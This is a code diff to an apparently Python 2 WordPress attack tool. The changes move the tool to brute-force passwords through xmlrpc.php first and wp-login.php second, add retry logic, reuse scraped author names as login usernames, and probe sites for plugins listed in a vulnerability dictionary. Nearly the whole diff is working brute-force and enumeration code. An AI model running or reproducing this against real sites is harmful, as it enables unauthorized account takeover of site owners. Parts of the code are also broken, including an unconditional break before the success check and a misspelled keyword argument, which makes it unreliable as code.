@@ -7,7 +7,7 @@ from multiprocessing.sharedctypes import Value
 import time 
 import os
 import sys
-from init import *
+from __init__ import *
 from logging import warning
 
 class WordPress_Scan():
@@ -65,6 +65,7 @@ class WordPress_Scan():
 			Author_list= re.findall(reg,Author_text)
 			if(len(Author_list)>0):
 				print "Wordpress Author maybe:\33[31m%s\33[0m" %Author_list[0]
+				self.Author = Author_list[0]
 
 	def LoadPlugin(self):
 		self.mutex = threading.Lock()
@@ -74,10 +75,10 @@ class WordPress_Scan():
 		ExistList = []
 		self.flag = 0
 		self.PluginQueue = Queue(maxsize = 10000)
-		linecount = len(open('./loopholes_plugin.txt','rU').readlines())
+		linecount = len(open('./dict/loopholes_plugin.txt','rU').readlines())
 		Plugin_Path =  "http://{0}".format(self.url)
-		if(os.path.exists(r'./loopholes_plugin.txt')):
-			file = open(r'./loopholes_plugin.txt','r')
+		if(os.path.exists(r'./dict/loopholes_plugin.txt')):
+			file = open(r'./dict/loopholes_plugin.txt','r')
 			for line in file:
 				PluginList = line.strip()
 				self.PluginQueue.put(PluginList)
@@ -108,11 +109,16 @@ class WordPress_Scan():
 				self.mutex.acquire()
 				self.TestNum+=1
 				self.mutex.release()
-			except Exception,ex:
+			except:
 				#warning(ex)
 				pass				
 			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
-			Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
+			try:
+				Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
+			except:
+				self.PluginQueue.put(PluginDir)
+				print 'connect timeout !!'
+				continue
 			if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
 				ExistList.append(PluginDir)
 			Plugin_Path =  self.url
@@ -128,19 +134,33 @@ class WordPress_Scan():
 		self.PwdQueue = Queue(maxsize = 10000)
 		self.TruePwd = Queue(maxsize =10000)
 		self.pwdcount = len(open(self.pwdfile,'rU').readlines())
-		RePath1 = requests.get(self.Brute_path1)
-		if(RePath1.status_code == 200):
-			print "Start wp-login.php Brute Force"
-			self.Login_Load_Brute_Force()
+		# RePath1 = requests.get(self.Brute_path1)
+		# if(RePath1.status_code == 200):
+		# 	print "Start wp-login.php Brute Force"
+		# 	self.Login_Load_Brute_Force()
+		# else:
+		# 	print"\33[33mwp-login.php does not exist!\33[0m"
+		# 	RePath2 = requests.post(self.Brute_path2)
+		# 	if(RePath2.status_code == 200):
+		# 		print "Start Xmlrpc.php Brute Force"
+		# 		self.Xmlrpc_Load_Brute_Force()
+		# 	else:
+		# 		print "\33[33mXML-RPC service has been disabled\33[0m"
+		# 		print "\33[33mStop Brute_Force!\33[0m"
+		RePath2 = requests.post(self.Brute_path2)
+		if(RePath2.status_code == 200):
+			print "Start Xmlrpc.php Brute Force"
+			self.Xmlrpc_Load_Brute_Force()
 		else:
-			print"\33[33mwp-login.php does not exist!\33[0m"
-			RePath2 = requests.post(self.Brute_path2)
-			if(RePath2.status_code == 200):
-				print "Start Xmlrpc.php Brute Force"
-				self.Xmlrpc_Load_Brute_Force()
+			print "\33[33mXML-RPC service has been disabled\33[0m"
+			RePath1 = requests.get(self.Brute_path1)
+			if(RePath1.status_code == 200):
+				print "Start wp-login.php Brute Force"
+				self.Login_Load_Brute_Force()
 			else:
-				print "\33[33mXML-RPC service has been disabled\33[0m"
+				print"\33[33mwp-login.php does not exist!\33[0m"
 				print "\33[33mStop Brute_Force!\33[0m"
+		
 
 	def  Login_Load_Brute_Force(self):
 		PwdThread = []
@@ -166,16 +186,28 @@ class WordPress_Scan():
 				Payload = self.PwdQueue.get(timeout = 1)
 			else:
 				break
-			Path1re = requests.post(self.Brute_path1,data = Payload,headers = HEADERS)
+			try:
+				print Payload
+				Path1re = requests.post(self.Brute_path1,data = Payload,header = HEADERS,timeout = 10)
+			except:
+				self.PwdQueue.put(Payload)
+				print "connect timeout reloading"
+				continue
 			self.pwdnum+=1
+			print Path1re.text
+			break
 			if(Path1re.text == ''):
 				self.KeyFlag.value = 1
 				print ""
 				print "\33[31mpassword :%s success !\33[0m" %Payload['pwd']
+				break
 			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
 			sys.stdout.flush()
 
 	def LoginReadPwdFile(self):
+		redrect =  self.url+'/wp-admin/'
+		if self.username == None:
+			self.username = str(self.Author)
 		file = open(self.pwdfile)
 		for line in file:
 			pwd = line.strip()
@@ -201,6 +233,8 @@ class WordPress_Scan():
 			print "Password Not Found!!!"
 
 	def XmlrpcReadPwdFile(self):
+		if self.username == None:
+			self.username = self.Author
 		file = open(self.pwdfile)
 		for line in file:
 			pwd = line.strip()
@@ -218,8 +252,8 @@ class WordPress_Scan():
   				self.PwdQueue.put(Payload)
   				self.TruePwd.put(pwd)
   		file.close()
-  		self.PwdQueue.cancel_join_thread()
-  		self.TruePwd.cancel_join_thread()
+  		#self.PwdQueue.cancel_join_thread()
+  		#self.TruePwd.cancel_join_thread()
 
   	def Xmlrpc_Brute_Force(self):
   		while 1:
@@ -230,7 +264,13 @@ class WordPress_Scan():
 				pwd = self.TruePwd.get(timeout = 1)
 			else:
 				break
-			Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS)
+			try:
+				Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS,timeout = 10)
+			except:
+				self.PwdQueue.put(Payload)
+  				self.TruePwd.put(pwd)
+				print 'connect timeout! Retry-After' 
+				continue
 			self.pwdnum+=1
 			msg = Path2re.text
 			if '<int>405</int>' in msg:
